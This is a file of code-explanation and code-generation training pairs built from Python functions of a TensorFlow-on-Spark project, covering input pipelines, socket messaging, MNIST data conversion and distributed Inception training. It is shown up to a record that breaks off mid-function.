{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef input_fn(data_file, num_epochs, shuffle, batch_size):\n  assert tf.gfile.Exists(data_file), (\n      '%s not found. Please make sure you have run census_dataset.py and '\n      'set the --data_dir argument to the correct path.' % data_file)\n\n  def parse_csv(value):\n    tf.logging.info('Parsing {}'.format(data_file))\n    columns = tf.decode_csv(value, record_defaults=_CSV_COLUMN_DEFAULTS)\n    features = dict(zip(_CSV_COLUMNS, columns))\n    labels = features.pop('income_bracket')\n    classes = tf.equal(labels, '>50K')  # binary classification\n    return features, classes\n\n  # Extract lines from input files using the Dataset API.\n  dataset = tf.data.TextLineDataset(data_file)\n\n  if shuffle:\n    dataset = dataset.shuffle(buffer_size=_NUM_EXAMPLES['train'])\n\n  dataset = dataset.map(parse_csv, num_parallel_calls=5)\n\n  # We call repeat after shuffling, rather than before, to prevent separate\n  # epochs from blending together.\n  dataset = dataset.repeat(num_epochs)\n  dataset = dataset.batch(batch_size)\n  return dataset", "response": "Generate an input function for the Estimator."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef receive(self, sock):\n    msg = None\n    data = b''\n    recv_done = False\n    recv_len = -1\n    while not recv_done:\n      buf = sock.recv(BUFSIZE)\n      if buf is None or len(buf) == 0:\n        raise Exception(\"socket closed\")\n      if recv_len == -1:\n        recv_len = struct.unpack('>I', buf[:4])[0]\n        data += buf[4:]\n        recv_len -= len(data)\n      else:\n        data += buf\n        recv_len -= len(buf)\n      recv_done = (recv_len == 0)\n\n    msg = pickle.loads(data)\n    return msg", "response": "Receive a message on the given socket."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsend msg to destination sock.", "response": "def send(self, sock, msg):\n    \"\"\"Send ``msg`` to destination ``sock``.\"\"\"\n    data = pickle.dumps(msg)\n    buf = struct.pack('>I', len(data)) + data\n    sock.sendall(buf)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nblocks until all reservations are received.", "response": "def await_reservations(self, sc, status={}, timeout=600):\n    \"\"\"Block until all reservations are received.\"\"\"\n    timespent = 0\n    while not self.reservations.done():\n      logging.info(\"waiting for {0} reservations\".format(self.reservations.remaining()))\n      # check status flags for any errors\n      if 'error' in status:\n        sc.cancelAllJobs()\n        sc.stop()\n        sys.exit(1)\n      time.sleep(1)\n      timespent += 1\n      if (timespent > timeout):\n        raise Exception(\"timed out waiting for reservations to complete\")\n    logging.info(\"all reservations completed\")\n    return self.reservations.get()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nstarts a listener thread for reservations on the server.", "response": "def start(self):\n    \"\"\"Start listener in a background thread\n\n    Returns:\n      address of the Server as a tuple of (host, port)\n    \"\"\"\n    server_sock = self.start_listening_socket()\n\n    # hostname may not be resolvable but IP address probably will be\n    host = self.get_server_ip()\n    port = server_sock.getsockname()[1]\n    addr = (host, port)\n    logging.info(\"listening for reservations at {0}\".format(addr))\n\n    def _listen(self, sock):\n      CONNECTIONS = []\n      CONNECTIONS.append(sock)\n\n      while not self.done:\n        read_socks, write_socks, err_socks = select.select(CONNECTIONS, [], [], 60)\n        for sock in read_socks:\n          if sock == server_sock:\n            client_sock, client_addr = sock.accept()\n            CONNECTIONS.append(client_sock)\n            logging.debug(\"client connected from {0}\".format(client_addr))\n          else:\n            try:\n              msg = self.receive(sock)\n              self._handle_message(sock, msg)\n            except Exception as e:\n              logging.debug(e)\n              sock.close()\n              CONNECTIONS.remove(sock)\n\n      server_sock.close()\n\n    t = threading.Thread(target=_listen, args=(self, server_sock))\n    t.daemon = True\n    t.start()\n\n    return addr"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nwrap function to wrap msg w/ msg_type.", "response": "def _request(self, msg_type, msg_data=None):\n    \"\"\"Helper function to wrap msg w/ msg_type.\"\"\"\n    msg = {}\n    msg['type'] = msg_type\n    if msg_data:\n      msg['data'] = msg_data\n\n    done = False\n    tries = 0\n    while not done and tries < MAX_RETRIES:\n      try:\n        MessageSocket.send(self, self.sock, msg)\n        done = True\n      except socket.error as e:\n        tries += 1\n        if tries >= MAX_RETRIES:\n          raise\n        print(\"Socket error: {}\".format(e))\n        self.sock.close()\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(self.server_addr)\n\n    logging.debug(\"sent: {0}\".format(msg))\n    resp = MessageSocket.receive(self, self.sock)\n    logging.debug(\"received: {0}\".format(resp))\n    return resp"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef await_reservations(self):\n    done = False\n    while not done:\n      done = self._request('QUERY')\n      time.sleep(1)\n    return self.get_reservations()", "response": "Poll until all reservations completed then return cluster_info."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nserializing an image and label as a TFExample byte string", "response": "def toTFExample(image, label):\n  \"\"\"Serializes an image/label as a TFExample byte string\"\"\"\n  example = tf.train.Example(\n    features=tf.train.Features(\n      feature={\n        'label': tf.train.Feature(int64_list=tf.train.Int64List(value=label.astype(\"int64\"))),\n        'image': tf.train.Feature(int64_list=tf.train.Int64List(value=image.astype(\"int64\")))\n      }\n    )\n  )\n  return example.SerializeToString()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nwriting MNIST image and label vectors into parallelized files on HDFS", "response": "def writeMNIST(sc, input_images, input_labels, output, format, num_partitions):\n  \"\"\"Writes MNIST image/label vectors into parallelized files on HDFS\"\"\"\n  # load MNIST gzip into memory\n  with open(input_images, 'rb') as f:\n    images = numpy.array(mnist.extract_images(f))\n\n  with open(input_labels, 'rb') as f:\n    if format == \"csv2\":\n      labels = numpy.array(mnist.extract_labels(f, one_hot=False))\n    else:\n      labels = numpy.array(mnist.extract_labels(f, one_hot=True))\n\n  shape = images.shape\n  print(\"images.shape: {0}\".format(shape))          # 60000 x 28 x 28\n  print(\"labels.shape: {0}\".format(labels.shape))   # 60000 x 10\n\n  # create RDDs of vectors\n  imageRDD = sc.parallelize(images.reshape(shape[0], shape[1] * shape[2]), num_partitions)\n  labelRDD = sc.parallelize(labels, num_partitions)\n\n  output_images = output + \"/images\"\n  output_labels = output + \"/labels\"\n\n  # save RDDs as specific format\n  if format == \"pickle\":\n    imageRDD.saveAsPickleFile(output_images)\n    labelRDD.saveAsPickleFile(output_labels)\n  elif format == \"csv\":\n    imageRDD.map(toCSV).saveAsTextFile(output_images)\n    labelRDD.map(toCSV).saveAsTextFile(output_labels)\n  elif format == \"csv2\":\n    imageRDD.map(toCSV).zip(labelRDD).map(lambda x: str(x[1]) + \"|\" + x[0]).saveAsTextFile(output)\n  else:  # format == \"tfr\":\n    tfRDD = imageRDD.zip(labelRDD).map(lambda x: (bytearray(toTFExample(x[0], x[1])), None))\n    # requires: --jars tensorflow-hadoop-1.0-SNAPSHOT.jar\n    tfRDD.saveAsNewAPIHadoopFile(output, \"org.tensorflow.hadoop.io.TFRecordFileOutputFormat\",\n                                 keyClass=\"org.apache.hadoop.io.BytesWritable\",\n                                 valueClass=\"org.apache.hadoop.io.NullWritable\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef readMNIST(sc, output, format):\n\n  output_images = output + \"/images\"\n  output_labels = output + \"/labels\"\n  imageRDD = None\n  labelRDD = None\n\n  if format == \"pickle\":\n    imageRDD = sc.pickleFile(output_images)\n    labelRDD = sc.pickleFile(output_labels)\n  elif format == \"csv\":\n    imageRDD = sc.textFile(output_images).map(fromCSV)\n    labelRDD = sc.textFile(output_labels).map(fromCSV)\n  else:  # format.startswith(\"tf\"):\n    # requires: --jars tensorflow-hadoop-1.0-SNAPSHOT.jar\n    tfRDD = sc.newAPIHadoopFile(output, \"org.tensorflow.hadoop.io.TFRecordFileInputFormat\",\n                                keyClass=\"org.apache.hadoop.io.BytesWritable\",\n                                valueClass=\"org.apache.hadoop.io.NullWritable\")\n    imageRDD = tfRDD.map(lambda x: fromTFExample(bytes(x[0])))\n\n  num_images = imageRDD.count()\n  num_labels = labelRDD.count() if labelRDD is not None else num_images\n  samples = imageRDD.take(10)\n  print(\"num_images: \", num_images)\n  print(\"num_labels: \", num_labels)\n  print(\"samples: \", samples)", "response": "Reads/verifies previously created output"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef inference(images, num_classes, for_training=False, restore_logits=True,\n              scope=None):\n  \"\"\"Build Inception v3 model architecture.\n\n  See here for reference: http://arxiv.org/abs/1512.00567\n\n  Args:\n    images: Images returned from inputs() or distorted_inputs().\n    num_classes: number of classes\n    for_training: If set to `True`, build the inference model for training.\n      Kernels that operate differently for inference during training\n      e.g. dropout, are appropriately configured.\n    restore_logits: whether or not the logits layers should be restored.\n      Useful for fine-tuning a model with different num_classes.\n    scope: optional prefix string identifying the ImageNet tower.\n\n  Returns:\n    Logits. 2-D float Tensor.\n    Auxiliary Logits. 2-D float Tensor of side-head. Used for training only.\n  \"\"\"\n  # Parameters for BatchNorm.\n  batch_norm_params = {\n      # Decay for the moving averages.\n      'decay': BATCHNORM_MOVING_AVERAGE_DECAY,\n      # epsilon to prevent 0s in variance.\n      'epsilon': 0.001,\n  }\n  # Set weight_decay for weights in Conv and FC layers.\n  with slim.arg_scope([slim.ops.conv2d, slim.ops.fc], weight_decay=0.00004):\n    with slim.arg_scope([slim.ops.conv2d],\n                        stddev=0.1,\n                        activation=tf.nn.relu,\n                        batch_norm_params=batch_norm_params):\n      logits, endpoints = slim.inception.inception_v3(\n          images,\n          dropout_keep_prob=0.8,\n          num_classes=num_classes,\n          is_training=for_training,\n          restore_logits=restore_logits,\n          scope=scope)\n\n  # Add summaries for viewing model statistics on TensorBoard.\n  _activation_summaries(endpoints)\n\n  # Grab the logits associated with the side head. Employed during training.\n  auxiliary_logits = endpoints['aux_logits']\n\n  return logits, auxiliary_logits", "response": "Builds an Inception v3 model architecture."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef loss(logits, labels, batch_size=None):\n  if not batch_size:\n    batch_size = FLAGS.batch_size\n\n  # Reshape the labels into a dense Tensor of\n  # shape [FLAGS.batch_size, num_classes].\n  sparse_labels = tf.reshape(labels, [batch_size, 1])\n  indices = tf.reshape(tf.range(batch_size), [batch_size, 1])\n  concated = tf.concat(axis=1, values=[indices, sparse_labels])\n  num_classes = logits[0].get_shape()[-1].value\n  dense_labels = tf.sparse_to_dense(concated,\n                                    [batch_size, num_classes],\n                                    1.0, 0.0)\n\n  # Cross entropy loss for the main softmax prediction.\n  slim.losses.cross_entropy_loss(logits[0],\n                                 dense_labels,\n                                 label_smoothing=0.1,\n                                 weight=1.0)\n\n  # Cross entropy loss for the auxiliary softmax head.\n  slim.losses.cross_entropy_loss(logits[1],\n                                 dense_labels,\n                                 label_smoothing=0.1,\n                                 weight=0.4,\n                                 scope='aux_loss')", "response": "Adds all losses for the model."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfunction that wraps the creation of TensorFlow tf. train. Server for a node in a distributed TensorFlow cluster.", "response": "def start_cluster_server(ctx, num_gpus=1, rdma=False):\n  \"\"\"Function that wraps the creation of TensorFlow ``tf.train.Server`` for a node in a distributed TensorFlow cluster.\n\n  This is intended to be invoked from within the TF ``map_fun``, replacing explicit code to instantiate ``tf.train.ClusterSpec``\n  and ``tf.train.Server`` objects.\n\n  Args:\n    :ctx: TFNodeContext containing the metadata specific to this node in the cluster.\n    :num_gpu: number of GPUs desired\n    :rdma: boolean indicating if RDMA 'iverbs' should be used for cluster communications.\n\n  Returns:\n    A tuple of (cluster_spec, server)\n  \"\"\"\n  import tensorflow as tf\n  from . import gpu_info\n\n  logging.info(\"{0}: ======== {1}:{2} ========\".format(ctx.worker_num, ctx.job_name, ctx.task_index))\n  cluster_spec = ctx.cluster_spec\n  logging.info(\"{0}: Cluster spec: {1}\".format(ctx.worker_num, cluster_spec))\n\n  if tf.test.is_built_with_cuda() and num_gpus > 0:\n    # compute my index relative to other nodes placed on the same host (for GPU allocation)\n    my_addr = cluster_spec[ctx.job_name][ctx.task_index]\n    my_host = my_addr.split(':')[0]\n    flattened = [v for sublist in cluster_spec.values() for v in sublist]\n    local_peers = [p for p in flattened if p.startswith(my_host)]\n    my_index = local_peers.index(my_addr)\n\n    # GPU\n    gpu_initialized = False\n    retries = 3\n    while not gpu_initialized and retries > 0:\n      try:\n        # override PS jobs to only reserve one GPU\n        if ctx.job_name == 'ps':\n          num_gpus = 1\n\n        # Find a free gpu(s) to use\n        gpus_to_use = gpu_info.get_gpus(num_gpus, my_index)\n        gpu_prompt = \"GPU\" if num_gpus == 1 else \"GPUs\"\n        logging.info(\"{0}: Using {1}: {2}\".format(ctx.worker_num, gpu_prompt, gpus_to_use))\n\n        # Set GPU device to use for TensorFlow\n        os.environ['CUDA_VISIBLE_DEVICES'] = gpus_to_use\n\n        # Create a cluster from the parameter server and worker hosts.\n        cluster = tf.train.ClusterSpec(cluster_spec)\n\n        # Create and start a server for the local task.\n        if rdma:\n          server = tf.train.Server(cluster, ctx.job_name, ctx.task_index, protocol=\"grpc+verbs\")\n        else:\n          server = tf.train.Server(cluster, ctx.job_name, ctx.task_index)\n        gpu_initialized = True\n      except Exception as e:\n        print(e)\n        logging.error(\"{0}: Failed to allocate GPU, trying again...\".format(ctx.worker_num))\n        retries -= 1\n        time.sleep(10)\n    if not gpu_initialized:\n      raise Exception(\"Failed to allocate GPU\")\n  else:\n    # CPU\n    os.environ['CUDA_VISIBLE_DEVICES'] = ''\n    logging.info(\"{0}: Using CPU\".format(ctx.worker_num))\n\n    # Create a cluster from the parameter server and worker hosts.\n    cluster = tf.train.ClusterSpec(cluster_spec)\n\n    # Create and start a server for the local task.\n    server = tf.train.Server(cluster, ctx.job_name, ctx.task_index)\n\n  return (cluster, server)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget a batch of items from the input RDD.", "response": "def next_batch(self, batch_size):\n    \"\"\"Gets a batch of items from the input RDD.\n\n    If multiple tensors are provided per row in the input RDD, e.g. tuple of (tensor1, tensor2, ..., tensorN) and:\n\n    * no ``input_mapping`` was provided to the DataFeed constructor, this will return an array of ``batch_size`` tuples,\n      and the caller is responsible for separating the tensors.\n    * an ``input_mapping`` was provided to the DataFeed constructor, this will return a dictionary of N tensors,\n      with tensor names as keys and arrays of length ``batch_size`` as values.\n\n    Note: if the end of the data is reached, this may return with fewer than ``batch_size`` items.\n\n    Args:\n      :batch_size: number of items to retrieve.\n\n    Returns:\n      A batch of items or a dictionary of tensors.\n    \"\"\"\n    logging.debug(\"next_batch() invoked\")\n    queue = self.mgr.get_queue(self.qname_in)\n    tensors = [] if self.input_tensors is None else {tensor: [] for tensor in self.input_tensors}\n    count = 0\n    while count < batch_size:\n      item = queue.get(block=True)\n      if item is None:\n        # End of Feed\n        logging.info(\"next_batch() got None\")\n        queue.task_done()\n        self.done_feeding = True\n        break\n      elif type(item) is marker.EndPartition:\n        # End of Partition\n        logging.info(\"next_batch() got EndPartition\")\n        queue.task_done()\n        if not self.train_mode and count > 0:\n          break\n      else:\n        # Normal item\n        if self.input_tensors is None:\n          tensors.append(item)\n        else:\n          for i in range(len(self.input_tensors)):\n            tensors[self.input_tensors[i]].append(item[i])\n        count += 1\n        queue.task_done()\n    logging.debug(\"next_batch() returning {0} items\".format(count))\n    return tensors"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef batch_results(self, results):\n    logging.debug(\"batch_results() invoked\")\n    queue = self.mgr.get_queue(self.qname_out)\n    for item in results:\n      queue.put(item, block=True)\n    logging.debug(\"batch_results() returning data\")", "response": "Push a batch of output results to the Spark output RDD of TFCluster. inference."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nterminates data feeding early.", "response": "def terminate(self):\n    \"\"\"Terminate data feeding early.\n\n    Since TensorFlow applications can often terminate on conditions unrelated to the training data (e.g. steps, accuracy, etc),\n    this method signals the data feeding process to ignore any further incoming data.  Note that Spark itself does not have a mechanism\n    to terminate an RDD operation early, so the extra partitions will still be sent to the executors (but will be ignored).  Because\n    of this, you should size your input data accordingly to avoid excessive overhead.\n    \"\"\"\n    logging.info(\"terminate() invoked\")\n    self.mgr.set('state', 'terminating')\n\n    # drop remaining items in the queue\n    queue = self.mgr.get_queue(self.qname_in)\n    count = 0\n    done = False\n    while not done:\n      try:\n        queue.get(block=True, timeout=5)\n        queue.task_done()\n        count += 1\n      except Empty:\n        logging.info(\"dropped {0} items from queue\".format(count))\n        done = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef export_fun(args):\n  # Input placeholder for inferencing\n  x = tf.placeholder(tf.float32, [None, IMAGE_PIXELS * IMAGE_PIXELS], name=\"x\")\n\n  # Variables of the hidden layer\n  hid_w = tf.Variable(tf.truncated_normal([IMAGE_PIXELS * IMAGE_PIXELS, hidden_units],\n                      stddev=1.0 / IMAGE_PIXELS), name=\"hid_w\")\n  hid_b = tf.Variable(tf.zeros([hidden_units]), name=\"hid_b\")\n  tf.summary.histogram(\"hidden_weights\", hid_w)\n\n  # Variables of the softmax layer\n  sm_w = tf.Variable(tf.truncated_normal([hidden_units, 10],\n                     stddev=1.0 / math.sqrt(hidden_units)), name=\"sm_w\")\n  sm_b = tf.Variable(tf.zeros([10]), name=\"sm_b\")\n\n  hid_lin = tf.nn.xw_plus_b(x, hid_w, hid_b)\n  hid = tf.nn.relu(hid_lin)\n  y = tf.nn.softmax(tf.nn.xw_plus_b(hid, sm_w, sm_b))\n  prediction = tf.argmax(y, 1, name=\"prediction\")\n\n  saver = tf.train.Saver()\n\n  with tf.Session() as sess:\n    # load graph from a checkpoint\n    logging.info(\"model path: {}\".format(args.model_dir))\n    ckpt = tf.train.get_checkpoint_state(args.model_dir)\n    logging.info(\"ckpt: {}\".format(ckpt))\n    assert ckpt and ckpt.model_checkpoint_path, \"Invalid model checkpoint path: {}\".format(args.model_dir)\n    saver.restore(sess, ckpt.model_checkpoint_path)\n\n    logging.info(\"Exporting saved_model to: {}\".format(args.export_dir))\n    # exported signatures defined in code\n    signatures = {\n      tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY: {\n        'inputs': {'image': x},\n        'outputs': {'prediction': prediction},\n        'method_name': tf.saved_model.signature_constants.PREDICT_METHOD_NAME\n      },\n      'featurize': {\n        'inputs': {'image': x},\n        'outputs': {'features': hid},\n        'method_name': 'featurize'\n      }\n    }\n    TFNode.export_saved_model(sess,\n                              args.export_dir,\n                              tf.saved_model.tag_constants.SERVING,\n                              signatures)\n    logging.info(\"Exported saved_model\")", "response": "Define a TF graph for inferencing."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ntraining Inception on a dataset for a number of steps.", "response": "def train(target, dataset, cluster_spec, ctx):\n  \"\"\"Train Inception on a dataset for a number of steps.\"\"\"\n  # Number of workers and parameter servers are infered from the workers and ps\n  # hosts string.\n  num_workers = len(cluster_spec.as_dict()['worker'])\n  num_parameter_servers = len(cluster_spec.as_dict()['ps'])\n  # If no value is given, num_replicas_to_aggregate defaults to be the number of\n  # workers.\n  if FLAGS.num_replicas_to_aggregate == -1:\n    num_replicas_to_aggregate = num_workers\n  else:\n    num_replicas_to_aggregate = FLAGS.num_replicas_to_aggregate\n\n  # Both should be greater than 0 in a distributed training.\n  assert num_workers > 0 and num_parameter_servers > 0, (' num_workers and '\n                                                         'num_parameter_servers'\n                                                         ' must be > 0.')\n\n  # Choose worker 0 as the chief. Note that any worker could be the chief\n  # but there should be only one chief.\n  is_chief = (FLAGS.task_id == 0)\n\n  # Ops are assigned to worker by default.\n  with tf.device('/job:worker/task:%d' % FLAGS.task_id):\n    # Variables and its related init/assign ops are assigned to ps.\n    with slim.scopes.arg_scope(\n          [slim.variables.variable, slim.variables.global_step],\n          device=slim.variables.VariableDeviceChooser(num_parameter_servers)):\n      # Create a variable to count the number of train() calls. This equals the\n      # number of updates applied to the variables.\n      global_step = slim.variables.global_step()\n\n      # Calculate the learning rate schedule.\n      num_batches_per_epoch = (dataset.num_examples_per_epoch() /\n                               FLAGS.batch_size)\n      # Decay steps need to be divided by the number of replicas to aggregate.\n      decay_steps = int(num_batches_per_epoch * FLAGS.num_epochs_per_decay /\n                        num_replicas_to_aggregate)\n\n      # Decay the learning rate exponentially based on the number of steps.\n      lr = tf.train.exponential_decay(FLAGS.initial_learning_rate,\n                                      global_step,\n                                      decay_steps,\n                                      FLAGS.learning_rate_decay_factor,\n                                      staircase=True)\n      # Add a summary to track the learning rate.\n      tf.summary.scalar('learning_rate', lr)\n\n      # Create an optimizer that performs gradient descent.\n      opt = tf.train.RMSPropOptimizer(lr,\n                                      RMSPROP_DECAY,\n                                      momentum=RMSPROP_MOMENTUM,\n                                      epsilon=RMSPROP_EPSILON)\n\n      if FLAGS.input_mode == 'spark':\n        def feed_dict(feed_batch):\n          # extract TFRecords, since feed_batch is [(TFRecord, None)]\n          tfrecords = []\n          for elem in feed_batch:\n            tfrecords.append(str(elem[0]))\n          return tfrecords\n\n        batch = tf.placeholder(tf.string, [FLAGS.batch_size / FLAGS.num_preprocess_threads])\n\n        # The following is adapted from image_processing.py to remove Readers/QueueRunners.\n        # Note: this removes the RandomShuffledQueue, so the incoming data is not shuffled.\n        # Presumably, this could be done on the Spark side or done in additional TF code.\n        examples = tf.unstack(batch)\n        images, labels = [], []\n        for example_serialized in examples:\n          for thread_id in range(FLAGS.num_preprocess_threads):\n            # Parse a serialized Example proto to extract the image and metadata.\n            image_buffer, label_index, bbox, _ = image_processing.parse_example_proto(example_serialized)\n            image = image_processing.image_preprocessing(image_buffer, bbox, train, thread_id)\n            images.append(image)\n            labels.append(label_index)\n        height = FLAGS.image_size\n        width = FLAGS.image_size\n        depth = 3\n        images = tf.cast(images, tf.float32)\n        images = tf.reshape(images, shape=[FLAGS.batch_size, height, width, depth])\n        tf.summary.image('images', images)\n        labels = tf.reshape(labels, [FLAGS.batch_size])\n      else:\n        images, labels = image_processing.distorted_inputs(\n            dataset,\n            batch_size=FLAGS.batch_size,\n            num_preprocess_threads=FLAGS.num_preprocess_threads)\n\n      # Number of classes in the Dataset label set plus 1.\n      # Label 0 is reserved for an (unused) background class.\n      num_classes = dataset.num_classes() + 1\n      logits = inception.inference(images, num_classes, for_training=True)\n      # Add classification loss.\n      inception.loss(logits, labels)\n\n      # Gather all of the losses including regularization losses.\n      losses = tf.get_collection(slim.losses.LOSSES_COLLECTION)\n      losses += tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES)\n\n      total_loss = tf.add_n(losses, name='total_loss')\n\n      if is_chief:\n        # Compute the moving average of all individual losses and the\n        # total loss.\n        loss_averages = tf.train.ExponentialMovingAverage(0.9, name='avg')\n        loss_averages_op = loss_averages.apply(losses + [total_loss])\n\n        # Attach a scalar summmary to all individual losses and the total loss;\n        # do the same for the averaged version of the losses.\n        for l in losses + [total_loss]:\n          loss_name = l.op.name\n          # Name each loss as '(raw)' and name the moving average version of the\n          # loss as the original loss name.\n          tf.summary.scalar(loss_name + ' (raw)', l)\n          tf.summary.scalar(loss_name, loss_averages.average(l))\n\n        # Add dependency to compute loss_averages.\n        with tf.control_dependencies([loss_averages_op]):\n          total_loss = tf.identity(total_loss)\n\n      # Track the moving averages of all trainable variables.\n      # Note that we maintain a 'double-average' of the BatchNormalization\n      # global statistics.\n      # This is not needed when the number of replicas are small but important\n      # for synchronous distributed training with tens of workers/replicas.\n      exp_moving_averager = tf.train.ExponentialMovingAverage(\n          inception.MOVING_AVERAGE_DECAY, global_step)\n\n      variables_to_average = (\n          tf.trainable_variables() + tf.moving_average_variables())\n\n      # Add histograms for model variables.\n      for var in variables_to_average:\n        tf.summary.histogram(var.op.name, var)\n\n      # Create synchronous replica optimizer.\n      opt = tf.train.SyncReplicasOptimizer(\n          opt,\n          replicas_to_aggregate=num_replicas_to_aggregate,\n          total_num_replicas=num_workers,\n          variable_averages=exp_moving_averager,\n          variables_to_average=variables_to_average)\n\n      batchnorm_updates = tf.get_collection(slim.ops.UPDATE_OPS_COLLECTION)\n      assert batchnorm_updates, 'Batchnorm updates are missing'\n      batchnorm_updates_op = tf.group(*batchnorm_updates)\n      # Add dependency to compute batchnorm_updates.\n      with tf.control_dependencies([batchnorm_updates_op]):\n        total_loss = tf.identity(total_loss)\n\n      # Compute gradients with respect to the loss.\n      grads = opt.compute_gradients(total_loss)\n\n      # Add histograms for gradients.\n      for grad, var in grads:\n        if grad is not None:\n          tf.summary.histogram(var.op.name + '/gradients', grad)\n\n      apply_gradients_op = opt.apply_gradients(grads, global_step=global_step)\n\n      with tf.control_dependencies([apply_gradients_op]):\n        train_op = tf.identity(total_loss, name='train_op')\n\n      # Get chief queue_runners, init_tokens and clean_up_op, which is used to\n      # synchronize replicas.\n      # More details can be found in sync_replicas_optimizer.\n      chief_queue_runners = [opt.get_chief_queue_runner()]\n      init_tokens_op = opt.get_init_tokens_op()\n\n      # Create a saver.\n      saver = tf.train.Saver()\n\n      # Build the summary operation based on the TF collection of Summaries.\n      summary_op = tf.summary.merge_all()\n\n      # Build an initialization operation to run below.\n      init_op = tf.global_variables_initializer()\n\n      # We run the summaries in the same thread as the training operations by\n      # passing in None for summary_op to avoid a summary_thread being started.\n      # Running summaries and training operations in parallel could run out of\n      # GPU memory.\n      summary_writer = tf.summary.FileWriter(\"tensorboard_%d\" % ctx.worker_num, graph=tf.get_default_graph())\n      sv = tf.train.Supervisor(is_chief=is_chief,\n                               logdir=FLAGS.train_dir,\n                               init_op=init_op,\n                               summary_op=None,\n                               global_step=global_step,\n                               summary_writer=summary_writer,\n                               saver=saver,\n                               save_model_secs=FLAGS.save_interval_secs)\n\n      tf.logging.info('%s Supervisor' % datetime.now())\n\n      sess_config = tf.ConfigProto(\n          allow_soft_placement=True,\n          log_device_placement=FLAGS.log_device_placement)\n\n      # Get a session.\n      sess = sv.prepare_or_wait_for_session(target, config=sess_config)\n\n      # Start the queue runners.\n      queue_runners = tf.get_collection(tf.GraphKeys.QUEUE_RUNNERS)\n      sv.start_queue_runners(sess, queue_runners)\n      tf.logging.info('Started %d queues for processing input data.',\n                      len(queue_runners))\n\n      if is_chief:\n        sv.start_queue_runners(sess, chief_queue_runners)\n        sess.run(init_tokens_op)\n\n      # Train, checking for Nans. Concurrently run the summary operation at a\n      # specified interval. Note that the summary_op and train_op never run\n      # simultaneously in order to prevent running out of GPU memory.\n      next_summary_time = time.time() + FLAGS.save_summaries_secs\n      tf_feed = TFNode.DataFeed(ctx.mgr)\n      while not sv.should_stop():\n        try:\n          start_time = time.time()\n          if FLAGS.input_mode == 'spark':\n            tmp = feed_dict(tf_feed.next_batch(FLAGS.batch_size / FLAGS.num_preprocess_threads))\n            feed = {batch: tmp}\n            loss_value, step = sess.run([train_op, global_step], feed_dict=feed)\n          else:\n            loss_value, step = sess.run([train_op, global_step])\n          assert not np.isnan(loss_value), 'Model diverged with loss = NaN'\n          if step > FLAGS.max_steps:\n            break\n          duration = time.time() - start_time\n\n          if step % 30 == 0:\n            examples_per_sec = FLAGS.batch_size / float(duration)\n            format_str = ('Worker %d: %s: step %d, loss = %.2f'\n                          '(%.1f examples/sec; %.3f  sec/batch)')\n            tf.logging.info(format_str %\n                            (FLAGS.task_id, datetime.now(), step, loss_value,\n                             examples_per_sec, duration))\n\n          # Determine if the summary_op should be run on the chief worker.\n          if FLAGS.input_mode == 'tf' and is_chief and next_summary_time < time.time():\n            tf.logging.info('Running Summary operation on the chief.')\n            summary_str = sess.run(summary_op)\n            sv.summary_computed(sess, summary_str)\n            tf.logging.info('Finished running Summary operation.')\n\n            # Determine the next time for running the summary.\n            next_summary_time += FLAGS.save_summaries_secs\n        except:\n          if is_chief:\n            tf.logging.info('About to execute sync_clean_up_op!')\n          raise\n\n      # Stop the TFNode data feed\n      if FLAGS.input_mode == 'spark':\n        tf_feed.terminate()\n\n      # Stop the supervisor.  This also waits for service threads to finish.\n      sv.stop()\n\n      # Save after the training ends.\n      if is_chief:\n        saver.save(sess,\n                   os.path.join(FLAGS.train_dir, 'model.ckpt'),\n                   global_step=global_step)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nevaluate model on Dataset for a number of steps.", "response": "def export(_):\n  FLAGS = tf.app.flags.FLAGS\n\n  \"\"\"Evaluate model on Dataset for a number of steps.\"\"\"\n  #with tf.Graph().as_default():\n  tf.reset_default_graph()\n\n  def preprocess_image(image_buffer):\n    \"\"\"Preprocess JPEG encoded bytes to 3D float Tensor.\"\"\"\n\n    # Decode the string as an RGB JPEG.\n    # Note that the resulting image contains an unknown height and width\n    # that is set dynamically by decode_jpeg. In other words, the height\n    # and width of image is unknown at compile-time.\n    image = tf.image.decode_jpeg(image_buffer, channels=3)\n    # After this point, all image pixels reside in [0,1)\n    # until the very end, when they're rescaled to (-1, 1).  The various\n    # adjust_* ops all require this range for dtype float.\n    image = tf.image.convert_image_dtype(image, dtype=tf.float32)\n    # Crop the central region of the image with an area containing 87.5% of\n    # the original image.\n    image = tf.image.central_crop(image, central_fraction=0.875)\n    # Resize the image to the original height and width.\n    image = tf.expand_dims(image, 0)\n    image = tf.image.resize_bilinear(\n        image, [FLAGS.image_size, FLAGS.image_size], align_corners=False)\n    image = tf.squeeze(image, [0])\n    # Finally, rescale to [-1,1] instead of [0, 1)\n    image = tf.subtract(image, 0.5)\n    image = tf.multiply(image, 2.0)\n    return image\n\n  # Get images and labels from the dataset.\n  jpegs = tf.placeholder(tf.string, [None], name='jpegs')\n  images = tf.map_fn(preprocess_image, jpegs, dtype=tf.float32)\n  labels = 